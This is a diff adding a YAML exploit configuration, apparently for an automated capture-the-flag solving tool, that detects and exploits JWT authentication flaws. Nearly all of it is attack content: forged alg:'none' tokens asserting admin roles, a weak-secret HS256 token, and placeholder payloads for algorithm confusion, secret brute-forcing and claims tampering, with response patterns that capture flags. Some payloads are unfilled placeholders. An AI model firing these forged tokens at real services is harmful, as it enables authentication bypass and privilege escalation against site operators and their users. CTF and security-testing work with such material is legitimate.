@@ -1,0 +1,168 @@
+# ============================================================
+# Tree metadata
+# ============================================================
+id: web_jwt
+name: JWT Authentication Bypass
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits JWT vulnerabilities including none algorithm, algorithm
+  confusion, weak secret brute-forcing, and signature bypass to escalate
+  privileges and forge authentication tokens.
+
+# ============================================================
+# Guard
+# ============================================================
+applies_when:
+  - "context.challenge.type == 'web'"
+
+min_confidence: 0.10
+
+stop_on_flag: true
+
+# ============================================================
+# Confidence seeds
+# ============================================================
+confidence_seeds:
+  - if: "any('jwt' in p.lower() or 'bearer' in p.lower() or 'authorization' in p.lower() for p in context.params)"
+    boost: 0.40
+    label: "JWT parameter or header detected"
+  - if: "any(p in context.found_paths for p in ['/login', '/auth', '/api', '/token'])"
+    boost: 0.20
+    label: "Authentication endpoint found"
+  - if: "'node' in context.tech_stack or 'express' in context.tech_stack or 'python' in context.tech_stack or 'flask' in context.tech_stack"
+    boost: 0.15
+    label: "JWT-common framework detected"
+
+# ============================================================
+# Detection paths
+# ============================================================
+detection_paths:
+
+  - id: jwt_token_presence
+    name: JWT token detection
+    description: >
+      Identify JWT tokens in headers, cookies, or parameters by pattern matching.
+    min_confidence: 0.10
+    steps:
+      - id: find_jwt
+        action: http_probe
+        params:
+          inject_into: none
+          payloads: []
+        signals:
+          - match: 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
+            on_match:
+              confidence_boost: 0.45
+              emit: jwt_found
+
+  - id: jwt_none_algorithm
+    name: None algorithm acceptance test
+    description: >
+      Test if server accepts JWT with "alg":"none" and empty signature.
+    min_confidence: 0.40
+    steps:
+      - id: none_alg_test
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.'
+            - 'eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.'
+            - 'eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.'
+        signals:
+          - match: 'admin|authorized|success'
+            on_match:
+              confidence_boost: 0.50
+              emit: jwt_none_accepted
+
+  - id: jwt_weak_secret
+    name: Weak secret detection
+    description: >
+      Test common weak secrets for HMAC-signed JWTs.
+    min_confidence: 0.35
+    steps:
+      - id: weak_secret_test
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.4Adcj0bT8RhVltfXbVbP3VlXjXTpNnF2-y4e8zf9sKM'
+        signals:
+          - match: 'admin|success|authorized'
+            on_match:
+              confidence_boost: 0.40
+              emit: jwt_weak_secret_confirmed
+
+# ============================================================
+# Exploitation paths
+# ============================================================
+exploitation_paths:
+
+  - id: jwt_none_exploit
+    name: None algorithm privilege escalation
+    requires_signal: jwt_none_accepted
+    technique: jwt_none_algorithm_bypass
+    steps:
+      - id: forge_admin_token
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlfQ.'
+            - 'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImFkbWluIjp0cnVlLCJyb2xlIjoiYWRtaW4ifQ.'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: jwt_algorithm_confusion
+    name: Algorithm confusion RS256->HS256
+    requires_signal: jwt_found
+    technique: jwt_alg_confusion
+    steps:
+      - id: alg_confusion_exploit
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.HMAC_SIGNATURE_WITH_PUBLIC_KEY'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+
+  - id: jwt_brute_secret
+    name: Brute force weak JWT secret
+    requires_signal: jwt_weak_secret_confirmed
+    technique: jwt_secret_bruteforce
+    steps:
+      - id: common_secrets
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'TOKEN_SIGNED_WITH_secret'
+            - 'TOKEN_SIGNED_WITH_password'
+            - 'TOKEN_SIGNED_WITH_123456'
+            - 'TOKEN_SIGNED_WITH_admin'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+
+  - id: jwt_claims_manipulation
+    name: JWT claims tampering
+    requires_signal: jwt_found
+    technique: jwt_payload_manipulation
+    steps:
+      - id: tamper_claims
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'MODIFIED_TOKEN_admin_true'
+            - 'MODIFIED_TOKEN_role_admin'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
